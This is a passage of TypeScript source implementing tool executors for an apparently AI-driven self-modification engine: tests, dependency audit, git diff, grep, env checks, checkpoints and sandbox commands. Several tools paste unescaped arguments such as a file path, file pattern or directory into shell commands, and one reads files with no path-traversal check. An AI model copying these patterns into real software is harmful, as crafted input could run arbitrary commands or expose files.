  if (isDeferredMode()) {
    stageRestart(reason, userId);
    return {
      success: true,
      data: { message: "Restart staged — will execute after all changes are flushed to disk." },
    };
  }

  const result = await requestRestart(reason, userId);
  return {
    success: result.success,
    data: { message: result.message },
    error: result.success ? undefined : result.message,
  };
}

async function execSelfModificationHistory(
  limit?: number
): Promise<ToolExecutionResult> {
  const result = await getModificationHistory(limit || 20);
  if (!result.success) return { success: false, error: result.error };
  return {
    success: true,
    data: {
      count: result.entries?.length || 0,
      entries: result.entries,
    },
  };
}

function execSelfGetProtectedFiles(): ToolExecutionResult {
  return {
    success: true,
    data: {
      protectedFiles: getProtectedFiles(),
      allowedDirectories: getAllowedDirectories(),
      message:
        "Protected files cannot be modified by the self-improvement engine. Only files in allowed directories can be changed.",
    },
  };
}


// ─── Builder Tool Executor Functions ─────────────────────────────────

async function execSelfTypeCheck(userId?: number): Promise<ToolExecutionResult> {
  const start = Date.now();
  const result = await runTypeCheck();
  const durationMs = Date.now() - start;
  const summary = result.passed
    ? "TypeScript: 0 errors — all types are valid"
    : `TypeScript: ${result.errorCount} error(s) found`;

  // Log to builder_activity_log
  try {
    const db = await getDb();
    if (db) {
      await db.insert(builderActivityLog).values({
        userId: userId ?? 0,
        tool: "self_type_check",
        status: result.passed ? "success" : "failure",
        summary,
        durationMs,
        details: { errorCount: result.errorCount, output: result.output?.slice(0, 2000) },
      });
    }
  } catch (e) { /* non-critical */ }

  return {
    success: true,
    data: {
      passed: result.passed,
      errorCount: result.errorCount,
      output: result.output,
      summary,
    },
  };
}

async function execSelfRunTests(
  testPattern?: string,
  userId?: number
): Promise<ToolExecutionResult> {
  const start = Date.now();
  const result = await runTests(testPattern);
  const durationMs = Date.now() - start;
  const summary = result.passed
    ? `Tests: all ${result.totalTests} passed`
    : `Tests: ${result.failedTests} of ${result.totalTests} failed`;

  // Log to builder_activity_log
  try {
    const db = await getDb();
    if (db) {
      await db.insert(builderActivityLog).values({
        userId: userId ?? 0,
        tool: "self_run_tests",
        status: result.passed ? "success" : "failure",
        summary,
        durationMs,
        details: { totalTests: result.totalTests, failedTests: result.failedTests, pattern: testPattern },
      });
    }
  } catch (e) { /* non-critical */ }

  return {
    success: true,
    data: {
      passed: result.passed,
      totalTests: result.totalTests,
      failedTests: result.failedTests,
      output: result.output,
      summary,
    },
  };
}

// ─── Professional Builder Executor Functions ─────────────────────────

const PROJ_ROOT = process.cwd();

async function execSelfDependencyAudit(
  focus?: string
): Promise<ToolExecutionResult> {
  try {
    const pkgPath = path.join(PROJ_ROOT, "package.json");
    if (!fs.existsSync(pkgPath)) {
      return { success: false, error: "No package.json found in project root" };
    }
    const pkg = JSON.parse(fs.readFileSync(pkgPath, "utf-8"));
    const deps = { ...pkg.dependencies, ...pkg.devDependencies };
    const totalDeps = Object.keys(deps).length;

    // Security patterns to flag
    const securityFlags: Array<{ pkg: string; issue: string; severity: string }> = [];
    const knownRisky = [
      { pattern: /^node-ipc$/i, issue: "Known supply-chain attack vector (protestware)", severity: "critical" },
      { pattern: /^event-stream$/i, issue: "Historical supply-chain compromise", severity: "high" },
      { pattern: /^colors$/i, issue: "Historical protestware incident", severity: "medium" },
      { pattern: /^faker$/i, issue: "Historical protestware incident", severity: "medium" },
    ];
    for (const [name] of Object.entries(deps)) {
      for (const risky of knownRisky) {
        if (risky.pattern.test(name)) {
          securityFlags.push({ pkg: name, issue: risky.issue, severity: risky.severity });
        }
      }
    }

    // Check for wildcard or git versions (risky)
    const riskyVersions: Array<{ pkg: string; version: string; issue: string }> = [];
    for (const [name, version] of Object.entries(deps)) {
      const v = version as string;
      if (v === "*" || v === "latest") {
        riskyVersions.push({ pkg: name, version: v, issue: "Wildcard version — unpinned, could break on any update" });
      } else if (v.startsWith("git") || v.startsWith("http") || v.includes("github")) {
        riskyVersions.push({ pkg: name, version: v, issue: "Git/URL dependency — not auditable via npm registry" });
      } else if (!v.match(/^[\^~]?\d/)) {
        riskyVersions.push({ pkg: name, version: v, issue: "Non-standard version specifier" });
      }
    }

    // Run npm audit if available
    let auditResult: string | null = null;
    try {
      const output = execSync("npm audit --json 2>/dev/null", { cwd: PROJ_ROOT, encoding: "utf-8", timeout: 15000 });
      const audit = JSON.parse(output);
      const vulns = audit.metadata?.vulnerabilities || {};
      auditResult = `critical: ${vulns.critical || 0}, high: ${vulns.high || 0}, moderate: ${vulns.moderate || 0}, low: ${vulns.low || 0}`;
    } catch (e: unknown) {
      // npm audit returns non-zero when vulns found, parse anyway
      try {
        const audit = JSON.parse((e as any).stdout || "{}");
        const vulns = audit.metadata?.vulnerabilities || {};
        auditResult = `critical: ${vulns.critical || 0}, high: ${vulns.high || 0}, moderate: ${vulns.moderate || 0}, low: ${vulns.low || 0}`;
      } catch { auditResult = "npm audit unavailable"; }
    }

    // Check for outdated lockfile
    const lockExists = fs.existsSync(path.join(PROJ_ROOT, "package-lock.json")) || fs.existsSync(path.join(PROJ_ROOT, "pnpm-lock.yaml"));

    return {
      success: true,
      data: {
        totalDependencies: totalDeps,
        productionDeps: Object.keys(pkg.dependencies || {}).length,
        devDeps: Object.keys(pkg.devDependencies || {}).length,
        securityFlags: securityFlags.length > 0 ? securityFlags : "No known risky packages detected",
        riskyVersions: riskyVersions.length > 0 ? riskyVersions : "All versions properly pinned",
        npmAudit: auditResult,
        lockfilePresent: lockExists,
        nodeEngine: pkg.engines?.node || "not specified",
        summary: `${totalDeps} dependencies audited. ${securityFlags.length} security flags, ${riskyVersions.length} risky versions.`,
      },
    };
  } catch (err: unknown) {
    return { success: false, error: `Dependency audit failed: ${getErrorMessage(err)}` };
  }
}

async function execSelfGrepCodebase(
  pattern: string,
  filePattern?: string,
  maxResults?: number
): Promise<ToolExecutionResult> {
  try {
    const limit = Math.min(maxResults || 50, 100);
    const include = filePattern ? `--include='${filePattern}'` : "--include='*.ts' --include='*.tsx' --include='*.js' --include='*.jsx' --include='*.json' --include='*.css' --include='*.md'";
    const cmd = `grep -rn ${include} --exclude-dir=node_modules --exclude-dir=dist --exclude-dir=.git -E '${pattern.replace(/'/g, "'\\''")}' . | head -${limit}`;
    const output = execSync(cmd, { cwd: PROJ_ROOT, encoding: "utf-8", timeout: 10000 }).trim();
    const lines = output ? output.split("\n") : [];
    const results = lines.map(line => {
      const match = line.match(/^\.\/(.+?):(\d+):(.*)$/);
      if (match) return { file: match[1], line: parseInt(match[2]), content: match[3].trim() };
      return { file: "unknown", line: 0, content: line };
    });
    return {
      success: true,
      data: {
        pattern,
        matchCount: results.length,
        truncated: results.length >= limit,
        results,
      },
    };
  } catch (err: unknown) {
    // grep returns exit code 1 when no matches found
    if ((err as any).status === 1) {
      return { success: true, data: { pattern, matchCount: 0, results: [], message: "No matches found" } };
    }
    return { success: false, error: `Grep failed: ${getErrorMessage(err)}` };
  }
}

async function execSelfGitDiff(
  filePath?: string,
  staged?: boolean
): Promise<ToolExecutionResult> {
  try {
    const stagedFlag = staged ? "--cached" : "";
    const fileArg = filePath ? `-- ${filePath}` : "";
    const diffCmd = `git diff ${stagedFlag} --stat ${fileArg} 2>/dev/null`;
    const stat = execSync(diffCmd, { cwd: PROJ_ROOT, encoding: "utf-8", timeout: 5000 }).trim();
    const fullDiffCmd = `git diff ${stagedFlag} ${fileArg} 2>/dev/null | head -500`;
    const diff = execSync(fullDiffCmd, { cwd: PROJ_ROOT, encoding: "utf-8", timeout: 5000 }).trim();
    // Get status
    const statusCmd = `git status --porcelain ${fileArg} 2>/dev/null`;
    const status = execSync(statusCmd, { cwd: PROJ_ROOT, encoding: "utf-8", timeout: 5000 }).trim();
    const changedFiles = status ? status.split("\n").map(l => ({
      status: l.substring(0, 2).trim(),
      file: l.substring(3),
    })) : [];
    return {
      success: true,
      data: {
        changedFiles,
        fileCount: changedFiles.length,
        stat: stat || "No changes",
        diff: diff || "No diff available",
        truncated: diff.split("\n").length >= 500,
      },
    };
  } catch (err: unknown) {
    return { success: false, error: `Git diff failed: ${getErrorMessage(err)}` };
  }
}

async function execSelfEnvCheck(): Promise<ToolExecutionResult> {
  try {
    // Define required env vars by service category
    const envChecks: Record<string, { vars: string[]; critical: boolean }> = {
      database: { vars: ["DATABASE_URL"], critical: true },
      auth: { vars: ["SESSION_SECRET", "JWT_SECRET"], critical: true },
      github: { vars: ["GITHUB_PAT", "GITHUB_REPO"], critical: false },
      stripe: { vars: ["STRIPE_SECRET_KEY", "STRIPE_PUBLISHABLE_KEY", "STRIPE_WEBHOOK_SECRET"], critical: false },
      openai: { vars: ["OPENAI_API_KEY"], critical: false },
      email: { vars: ["SMTP_HOST", "SMTP_USER", "SMTP_PASS"], critical: false },
      binance: { vars: ["BINANCE_PAY_API_KEY", "BINANCE_PAY_SECRET_KEY"], critical: false },
      google: { vars: ["GOOGLE_CLIENT_ID", "GOOGLE_CLIENT_SECRET"], critical: false },
      server: { vars: ["PORT", "NODE_ENV"], critical: false },
    };

    const results: Record<string, { status: string; missing: string[]; set: string[] }> = {};
    let criticalMissing = 0;
    let totalMissing = 0;
    let totalSet = 0;

    for (const [service, config] of Object.entries(envChecks)) {
      const missing: string[] = [];
      const set: string[] = [];
      for (const v of config.vars) {
        if (process.env[v] && process.env[v]!.length > 0) {
          set.push(v);
          totalSet++;
        } else {
          missing.push(v);
          totalMissing++;
          if (config.critical) criticalMissing++;
        }
      }
      results[service] = {
        status: missing.length === 0 ? "\u2705 configured" : config.critical ? "\u274c CRITICAL — missing" : "\u26a0\ufe0f optional — missing",
        missing,
        set: set.map(v => `${v} (${process.env[v]!.length} chars)`), // length only, never the value
      };
    }

    return {
      success: true,
      data: {
        services: results,
        summary: {
          totalChecked: totalSet + totalMissing,
          configured: totalSet,
          missing: totalMissing,
          criticalMissing,
          nodeEnv: process.env.NODE_ENV || "not set",
          platform: process.platform,
          nodeVersion: process.version,
        },
        healthy: criticalMissing === 0,
      },
    };
  } catch (err: unknown) {
    return { success: false, error: `Env check failed: ${getErrorMessage(err)}` };
  }
}

async function execSelfDbSchemaInspect(
  table?: string
): Promise<ToolExecutionResult> {
  try {
    const db = await getDb();
    if (!db) return { success: false, error: "Database not available" };

    if (table) {
      // Validate table name to prevent SQL injection
      const safeTable = safeSqlIdentifier(table, "table");
      // Inspect specific table
      const [columns] = await db.execute(sql`SHOW COLUMNS FROM ${sql.raw(safeTable)}`) as any;
      const [indexes] = await db.execute(sql`SHOW INDEX FROM ${sql.raw(safeTable)}`) as any;
      const [createStmt] = await db.execute(sql`SHOW CREATE TABLE ${sql.raw(safeTable)}`) as any;
      return {
        success: true,
        data: {
          table,
          columns: Array.isArray(columns) ? columns : [],
          indexes: Array.isArray(indexes) ? indexes : [],
          createStatement: createStmt?.[0]?.["Create Table"] || "unavailable",
        },
      };
    } else {
      // List all tables with row counts
      const [tables] = await db.execute(sql`SHOW TABLES`) as any;
      const tableNames = Array.isArray(tables) ? tables.map((t: any) => Object.values(t)[0] as string) : [];
      const tableInfo: Array<{ name: string; columns: number; rows: string }> = [];
      for (const tName of tableNames.slice(0, 50)) { // cap at 50 tables
        try {
          const safeName = safeSqlIdentifier(tName, "table");
          const [cols] = await db.execute(sql`SELECT COUNT(*) as cnt FROM information_schema.columns WHERE table_name = ${tName}`) as any;
          const [rowCount] = await db.execute(sql`SELECT COUNT(*) as cnt FROM ${sql.raw(safeName)}`) as any;
          tableInfo.push({
            name: tName,
            columns: cols?.[0]?.cnt || 0,
            rows: String(rowCount?.[0]?.cnt || 0),
          });
        } catch { tableInfo.push({ name: tName, columns: 0, rows: "error" }); }
      }
      return {
        success: true,
        data: {
          tableCount: tableNames.length,
          tables: tableInfo,
        },
      };
    }
  } catch (err: unknown) {
    return { success: false, error: `DB schema inspect failed: ${getErrorMessage(err)}` };
  }
}

async function execSelfCodeStats(
  directory?: string
): Promise<ToolExecutionResult> {
  try {
    const targetDir = directory ? path.join(PROJ_ROOT, directory) : PROJ_ROOT;
    if (!fs.existsSync(targetDir)) {
      return { success: false, error: `Directory not found: ${directory}` };
    }

    // Count files and lines by extension
    const cmd = `find ${targetDir} -type f \( -name '*.ts' -o -name '*.tsx' -o -name '*.js' -o -name '*.jsx' -o -name '*.css' -o -name '*.json' -o -name '*.md' \) -not -path '*/node_modules/*' -not -path '*/dist/*' -not -path '*/.git/*' | head -1000`;
    const files = execSync(cmd, { encoding: "utf-8", timeout: 10000 }).trim().split("\n").filter(Boolean);

    const stats: Record<string, { files: number; lines: number; largest: { file: string; lines: number } }> = {};
    let totalLines = 0;
    let totalFiles = 0;
    const largestFiles: Array<{ file: string; lines: number }> = [];

    for (const file of files) {
      try {
        const ext = path.extname(file) || "other";
        const content = fs.readFileSync(file, "utf-8");
        const lineCount = content.split("\n").length;
        totalLines += lineCount;
        totalFiles++;
        const relPath = path.relative(PROJ_ROOT, file);
        largestFiles.push({ file: relPath, lines: lineCount });

        if (!stats[ext]) stats[ext] = { files: 0, lines: 0, largest: { file: "", lines: 0 } };
        stats[ext].files++;
        stats[ext].lines += lineCount;
        if (lineCount > stats[ext].largest.lines) {
          stats[ext].largest = { file: relPath, lines: lineCount };
        }
      } catch { /* skip unreadable files */ }
    }

    largestFiles.sort((a, b) => b.lines - a.lines);

    // Count functions/exports
    let functionCount = 0;
    let exportCount = 0;
    try {
      const funcCmd = `grep -rn --include='*.ts' --include='*.tsx' -E '(function |const .+ = (async )?\\(|=>)' ${targetDir} --exclude-dir=node_modules --exclude-dir=dist 2>/dev/null | wc -l`;
      functionCount = parseInt(execSync(funcCmd, { encoding: "utf-8", timeout: 10000 }).trim()) || 0;
      const exportCmd = `grep -rn --include='*.ts' --include='*.tsx' -E '^export ' ${targetDir} --exclude-dir=node_modules --exclude-dir=dist 2>/dev/null | wc -l`;
      exportCount = parseInt(execSync(exportCmd, { encoding: "utf-8", timeout: 10000 }).trim()) || 0;
    } catch { /* non-critical */ }

    return {
      success: true,
      data: {
        directory: directory || "project root",
        totalFiles,
        totalLines,
        byExtension: stats,
        top10LargestFiles: largestFiles.slice(0, 10),
        approximateFunctions: functionCount,
        exports: exportCount,
        summary: `${totalFiles} files, ${totalLines.toLocaleString()} lines of code, ~${functionCount} functions`,
      },
    };
  } catch (err: unknown) {
    return { success: false, error: `Code stats failed: ${getErrorMessage(err)}` };
  }
}

async function execSelfDeploymentCheck(
  quick?: boolean
): Promise<ToolExecutionResult> {
  try {
    const checks: Array<{ name: string; status: string; passed: boolean; detail?: string }> = [];

    // 1. Environment variables (always)
    const criticalEnvVars = ["DATABASE_URL", "SESSION_SECRET"];
    const missingEnv = criticalEnvVars.filter(v => !process.env[v]);
    checks.push({
      name: "Critical Environment Variables",
      status: missingEnv.length === 0 ? "PASS" : "FAIL",
      passed: missingEnv.length === 0,
      detail: missingEnv.length === 0 ? "All critical env vars set" : `Missing: ${missingEnv.join(", ")}`,
    });

    // 2. Database connectivity (always)
    try {
      const db = await getDb();
      if (db) {
        await db.execute(sql`SELECT 1`);
        checks.push({ name: "Database Connectivity", status: "PASS", passed: true, detail: "Connected successfully" });
      } else {
        checks.push({ name: "Database Connectivity", status: "FAIL", passed: false, detail: "getDb() returned null" });
      }
    } catch (dbErr: unknown) {
      checks.push({ name: "Database Connectivity", status: "FAIL", passed: false, detail: getErrorMessage(dbErr) });
    }

    // 3. TypeScript compilation (always)
    try {
      const tscOutput = execSync("npx tsc --noEmit 2>&1", { cwd: PROJ_ROOT, encoding: "utf-8", timeout: 30000 });
      checks.push({ name: "TypeScript Compilation", status: "PASS", passed: true, detail: "No type errors" });
    } catch (tscErr: unknown) {
      const errorCount = ((tscErr as any).stdout || "").split("\n").filter((l: string) => l.includes("error TS")).length;
      checks.push({ name: "TypeScript Compilation", status: "FAIL", passed: false, detail: `${errorCount} type error(s)` });
    }

    if (!quick) {
      // 4. Package.json validity
      try {
        const pkg = JSON.parse(fs.readFileSync(path.join(PROJ_ROOT, "package.json"), "utf-8"));
        checks.push({ name: "Package.json Valid", status: "PASS", passed: true, detail: `${pkg.name}@${pkg.version}` });
      } catch {
        checks.push({ name: "Package.json Valid", status: "FAIL", passed: false, detail: "Invalid or missing package.json" });
      }

      // 5. Critical files exist
      const criticalFiles = ["server/_core/index.ts", "client/src/App.tsx", "drizzle/schema.ts", "server/chat-router.ts"];
      const missingFiles = criticalFiles.filter(f => !fs.existsSync(path.join(PROJ_ROOT, f)));
      checks.push({
        name: "Critical Files Present",
        status: missingFiles.length === 0 ? "PASS" : "FAIL",
        passed: missingFiles.length === 0,
        detail: missingFiles.length === 0 ? `All ${criticalFiles.length} critical files present` : `Missing: ${missingFiles.join(", ")}`,
      });

      // 6. Git status
      try {
        const gitStatus = execSync("git status --porcelain 2>/dev/null", { cwd: PROJ_ROOT, encoding: "utf-8", timeout: 5000 }).trim();
        const uncommitted = gitStatus ? gitStatus.split("\n").length : 0;
        checks.push({
          name: "Git Status",
          status: uncommitted === 0 ? "PASS" : "WARN",
          passed: true, // warning, not failure
          detail: uncommitted === 0 ? "Clean working tree" : `${uncommitted} uncommitted change(s)`,
        });
      } catch {
        checks.push({ name: "Git Status", status: "SKIP", passed: true, detail: "Git not available" });
      }

      // 7. Disk space
      try {
        const df = execSync("df -h / | tail -1", { encoding: "utf-8", timeout: 5000 }).trim();
        const parts = df.split(/\s+/);
        const usePercent = parseInt(parts[4] || "0");
        checks.push({
          name: "Disk Space",
          status: usePercent < 90 ? "PASS" : "WARN",
          passed: usePercent < 95,
          detail: `${parts[4]} used (${parts[3]} available)`,
        });
      } catch { /* skip */ }
    }

    const passed = checks.filter(c => c.passed).length;
    const failed = checks.filter(c => !c.passed).length;
    const allPassed = failed === 0;

    return {
      success: true,
      data: {
        deployReady: allPassed,
        checks,
        summary: allPassed
          ? `\u2705 DEPLOY READY — All ${passed} checks passed`
          : `\u274c NOT READY — ${failed} check(s) failed out of ${checks.length}`,
        recommendation: allPassed
          ? "Safe to deploy. All critical systems verified."
          : "Fix the failing checks before deploying to avoid downtime.",
      },
    };
  } catch (err: unknown) {
    return { success: false, error: `Deployment check failed: ${getErrorMessage(err)}` };
  }
}

// ─── Checkpoint Executor Functions ──────────────────────────────

async function execSelfSaveCheckpoint(
  name: string,
  userId: number,
  userName?: string
): Promise<ToolExecutionResult> {
  if (!name || name.trim().length === 0) {
    return { success: false, error: "Checkpoint name is required. Provide a descriptive name like 'before-auth-refactor'." };
  }

  const start = Date.now();
  const result = await saveCheckpoint(name.trim(), userName || "user");
  const durationMs = Date.now() - start;

  // Log to builder_activity_log
  try {
    const db = await getDb();
    if (db) {
      await db.insert(builderActivityLog).values({
        userId,
        tool: "self_save_checkpoint",
        status: result.success ? "success" : "failure",
        summary: result.success
          ? `Checkpoint '${name}' saved — ${result.fileCount} files captured (ID: ${result.snapshotId})`
          : `Checkpoint save failed: ${result.error}`,
        durationMs,
        details: { name, snapshotId: result.snapshotId, fileCount: result.fileCount },
      });
    }
  } catch { /* non-critical */ }

  if (!result.success) {
    return { success: false, error: result.error };
  }

  return {
    success: true,
    data: {
      checkpointId: result.snapshotId,
      name,
      fileCount: result.fileCount,
      message: `\u2705 Checkpoint '${name}' saved successfully. ${result.fileCount} files captured. ID: ${result.snapshotId}. Use self_rollback_to_checkpoint to restore this state.`,
    },
  };
}

async function execSelfListCheckpoints(
  limit?: number
): Promise<ToolExecutionResult> {
  const result = await listCheckpoints(limit || 20);
  if (!result.success) {
    return { success: false, error: result.error };
  }

  return {
    success: true,
    data: {
      count: result.checkpoints?.length || 0,
      checkpoints: result.checkpoints,
      message: result.checkpoints && result.checkpoints.length > 0
        ? `Found ${result.checkpoints.length} checkpoint(s). Use the ID to rollback.`
        : "No checkpoints found. Use self_save_checkpoint to create one.",
    },
  };
}

async function execSelfRollbackToCheckpoint(
  checkpointId: number | undefined,
  userId: number,
  userName?: string
): Promise<ToolExecutionResult> {
  const start = Date.now();
  const result = await rollbackToCheckpoint(checkpointId);
  const durationMs = Date.now() - start;

  // Log to builder_activity_log
  try {
    const db = await getDb();
    if (db) {
      await db.insert(builderActivityLog).values({
        userId,
        tool: "self_rollback_to_checkpoint",
        status: result.success ? "success" : "failure",
        summary: result.success
          ? `Rolled back to checkpoint '${result.name}' (ID: ${result.snapshotId}) — ${result.filesRestored} files restored`
          : `Rollback failed: ${result.error}`,
        durationMs,
        details: { checkpointId, restoredId: result.snapshotId, name: result.name, filesRestored: result.filesRestored },
      });
    }
  } catch { /* non-critical */ }

  if (!result.success) {
    return { success: false, error: result.error };
  }

  return {
    success: true,
    data: {
      checkpointId: result.snapshotId,
      name: result.name,
      filesRestored: result.filesRestored,
      message: `\u2705 Rolled back to checkpoint '${result.name}' (ID: ${result.snapshotId}). ${result.filesRestored} files restored. A backup of the pre-rollback state was saved automatically.`,
    },
  };
}

// ─── Advanced Analysis Executor Functions ───────────────────────────────

async function execSelfAnalyzeFile(filePath: string): Promise<ToolExecutionResult> {
  try {
    const rootDir = process.cwd();
    const fullPath = path.join(rootDir, filePath);
    if (!fs.existsSync(fullPath)) return { success: false, error: `File not found: ${filePath}` };

    const content = fs.readFileSync(fullPath, "utf-8");
    const lines = content.split("\n");
    const analysis: any = {
      path: filePath,
      lines: lines.length,
      sizeBytes: Buffer.byteLength(content, "utf-8"),
      imports: [] as string[],
      exports: [] as string[],
      functions: [] as string[],
      classes: [] as string[],
      issues: [] as string[],
    };

    for (let i = 0; i < lines.length; i++) {
      const line = lines[i].trim();
      const lineNum = i + 1;

      // Imports
      if (line.startsWith("import ")) {
        analysis.imports.push(line.length > 100 ? line.slice(0, 100) + "..." : line);
      }

      // Exports
      if (/^export\s+(default\s+)?(function|const|class|type|interface|enum|async)/.test(line)) {
        const match = line.match(/^export\s+(?:default\s+)?(?:async\s+)?(?:function|const|class|type|interface|enum)\s+(\w+)/);
        if (match) analysis.exports.push(match[1]);
      }

      // Functions
      const funcMatch = line.match(/(?:async\s+)?function\s+(\w+)/);
      if (funcMatch) analysis.functions.push(`${funcMatch[1]} (line ${lineNum})`);
      const arrowMatch = line.match(/(?:const|let)\s+(\w+)\s*=\s*(?:async\s+)?\(/);
      if (arrowMatch) analysis.functions.push(`${arrowMatch[1]} (line ${lineNum})`);

      // Classes
      const classMatch = line.match(/class\s+(\w+)/);
      if (classMatch) analysis.classes.push(`${classMatch[1]} (line ${lineNum})`);

      // Issues detection
      if (line.includes("any") && /:\s*any\b/.test(line)) {
        analysis.issues.push(`Line ${lineNum}: 'any' type — consider using a specific type`);
      }
      if (line.includes("console.log") && !filePath.includes("test")) {
        analysis.issues.push(`Line ${lineNum}: console.log — consider using structured logging`);
      }
      if (line.includes("TODO") || line.includes("FIXME") || line.includes("HACK")) {
        analysis.issues.push(`Line ${lineNum}: ${line.trim().slice(0, 80)}`);
      }
      if (/catch\s*\(\s*\)/.test(line) || /catch\s*\{/.test(line)) {
        analysis.issues.push(`Line ${lineNum}: Empty catch block — errors swallowed silently`);
      }
    }

    // Limit issues to top 20
    if (analysis.issues.length > 20) {
      analysis.issues = [...analysis.issues.slice(0, 20), `... and ${analysis.issues.length - 20} more`];
    }

    return {
      success: true,
      data: {
        ...analysis,
        summary: `${filePath}: ${lines.length} lines, ${analysis.imports.length} imports, ${analysis.exports.length} exports, ${analysis.functions.length} functions, ${analysis.issues.length} potential issues`,
      },
    };
  } catch (err: unknown) {
    return { success: false, error: getErrorMessage(err) };
  }
}

async function execSelfFindDeadCode(directory?: string): Promise<ToolExecutionResult> {
  try {
    const rootDir = process.cwd();
    const targetDir = directory || "server";
    const fullDir = path.join(rootDir, targetDir);
    if (!fs.existsSync(fullDir)) return { success: false, error: `Directory not found: ${targetDir}` };

    // Collect all exports from all .ts/.tsx files in the target directory
    const exports: Array<{ name: string; file: string; line: number }> = [];
    const allFiles: string[] = [];

    const walk = (dir: string) => {
      const entries = fs.readdirSync(dir, { withFileTypes: true });
      for (const entry of entries) {
        const full = path.join(dir, entry.name);
        if (entry.isDirectory() && entry.name !== "node_modules" && entry.name !== "dist") {
          walk(full);
        } else if (entry.isFile() && /\.(ts|tsx)$/.test(entry.name)) {
          allFiles.push(full);
        }
      }
    };
    walk(fullDir);

    // Also scan client and shared for import checking
    const importSearchDirs = ["server", "client/src", "shared"].map(d => path.join(rootDir, d)).filter(d => fs.existsSync(d));
    const allProjectFiles: string[] = [];
    for (const searchDir of importSearchDirs) {
      const walkAll = (dir: string) => {
        const entries = fs.readdirSync(dir, { withFileTypes: true });
        for (const entry of entries) {
          const full = path.join(dir, entry.name);
          if (entry.isDirectory() && entry.name !== "node_modules" && entry.name !== "dist") {
            walkAll(full);
          } else if (entry.isFile() && /\.(ts|tsx)$/.test(entry.name)) {
            allProjectFiles.push(full);
          }
        }
      };
      walkAll(searchDir);
    }

    // Find exports
    for (const file of allFiles) {
      try {
        const content = fs.readFileSync(file, "utf-8");
        const lines = content.split("\n");
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i];
          const match = line.match(/^export\s+(?:default\s+)?(?:async\s+)?(?:function|const|class|type|interface|enum)\s+(\w+)/);
          if (match) {
            exports.push({ name: match[1], file: path.relative(rootDir, file), line: i + 1 });
          }
        }
      } catch { /* skip */ }
    }

    // Check which exports are never imported
    const deadExports: typeof exports = [];
    for (const exp of exports) {
      let found = false;
      for (const projectFile of allProjectFiles) {
        if (projectFile === path.join(rootDir, exp.file)) continue; // skip self
        try {
          const content = fs.readFileSync(projectFile, "utf-8");
          if (content.includes(exp.name)) { found = true; break; }
        } catch { /* skip */ }
      }
      if (!found) deadExports.push(exp);
    }

    return {
      success: true,
      data: {
        scannedDirectory: targetDir,
        totalExports: exports.length,
        deadExports: deadExports.length,
        items: deadExports.slice(0, 50).map(e => `${e.file}:${e.line} — ${e.name}`),
        note: deadExports.length > 50 ? `Showing first 50 of ${deadExports.length} dead exports` : undefined,
      },
    };
  } catch (err: unknown) {
    return { success: false, error: getErrorMessage(err) };
  }
}

async function execSelfApiMap(): Promise<ToolExecutionResult> {
  try {
    const rootDir = process.cwd();
    const results: any = { trpcProcedures: [], expressRoutes: [], webhooks: [] };

    // Scan for tRPC procedures in server/*.ts
    const serverDir = path.join(rootDir, "server");
    if (fs.existsSync(serverDir)) {
      const files = fs.readdirSync(serverDir).filter(f => f.endsWith(".ts"));
      for (const file of files) {
        try {
          const content = fs.readFileSync(path.join(serverDir, file), "utf-8");
          const lines = content.split("\n");
          for (let i = 0; i < lines.length; i++) {
            const line = lines[i];
            // tRPC procedures: publicProcedure, protectedProcedure, adminProcedure
            const procMatch = line.match(/(\w+):\s*(public|protected|admin)Procedure/);
            if (procMatch) {
              const isQuery = lines.slice(i, i + 5).some(l => l.includes(".query("));
              const isMutation = lines.slice(i, i + 5).some(l => l.includes(".mutation("));
              results.trpcProcedures.push({
                name: procMatch[1],
                auth: procMatch[2],
                type: isMutation ? "mutation" : isQuery ? "query" : "unknown",
                file: `server/${file}`,
                line: i + 1,
              });
            }
            // Express routes
            const expressMatch = line.match(/app\.(get|post|put|delete|patch)\s*\(\s*['"]([^'"]+)['"]/);
            if (expressMatch) {
              results.expressRoutes.push({
                method: expressMatch[1].toUpperCase(),
                path: expressMatch[2],
                file: `server/${file}`,
                line: i + 1,
              });
            }
            // Webhooks
            if (line.includes("webhook") && /app\.(post|get)/.test(line)) {
              const whMatch = line.match(/['"]([^'"]*webhook[^'"]*)['"]/);
              if (whMatch) {
                results.webhooks.push({
                  path: whMatch[1],
                  file: `server/${file}`,
                  line: i + 1,
                });
              }
            }
          }
        } catch { /* skip */ }
      }
    }

    // Also check _core/index.ts for Express routes
    const coreIndex = path.join(rootDir, "server/_core/index.ts");
    if (fs.existsSync(coreIndex)) {
      try {
        const content = fs.readFileSync(coreIndex, "utf-8");
        const lines = content.split("\n");
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i];
          const expressMatch = line.match(/app\.(get|post|put|delete|patch)\s*\(\s*['"]([^'"]+)['"]/);
          if (expressMatch) {
            results.expressRoutes.push({
              method: expressMatch[1].toUpperCase(),
              path: expressMatch[2],
              file: "server/_core/index.ts",
              line: i + 1,
            });
          }
        }
      } catch { /* skip */ }
    }

    return {
      success: true,
      data: {
        summary: `${results.trpcProcedures.length} tRPC procedures, ${results.expressRoutes.length} Express routes, ${results.webhooks.length} webhooks`,
        ...results,
      },
    };
  } catch (err: unknown) {
    return { success: false, error: getErrorMessage(err) };
  }
}

// ─── Sandbox Executor Functions ─────────────────────────────────────

async function getOrCreateDefaultSandbox(userId: number, sandboxId?: number): Promise<number> {
  if (sandboxId) return sandboxId;

  // Find existing default sandbox
  const existing = await listSandboxes(userId);
  if (existing.length > 0) return existing[0].id;

  // Create a new default sandbox
  const sandbox = await createSandbox(userId, "Default Workspace");
  return sandbox.id;
}

async function execSandboxCommand(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const command = args.command as string;
  if (!command) return { success: false, error: "Command is required" };

  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);
  const result = await executeCommand(sbId, userId, command, {
    timeoutMs: (args.timeoutMs as number) || 60_000,
    triggeredBy: "ai",
  });

  return {
    success: result.exitCode === 0,
    data: {
      output: result.output,
      exitCode: result.exitCode,
      durationMs: result.durationMs,
      workingDirectory: result.workingDirectory,
    },
    error: result.exitCode !== 0 ? `Command exited with code ${result.exitCode}` : undefined,
  };
}

async function execSandboxWriteFile(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const filePath = args.path as string;
  const content = args.content as string;
  if (!filePath || content === undefined) return { success: false, error: "Path and content are required" };

  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);
  const success = await sandboxWriteFileImpl(sbId, userId, filePath, content);

  return {
    success,
    data: { path: filePath, bytesWritten: content.length },
    error: success ? undefined : "Failed to write file",
  };
}

async function execSandboxReadFile(
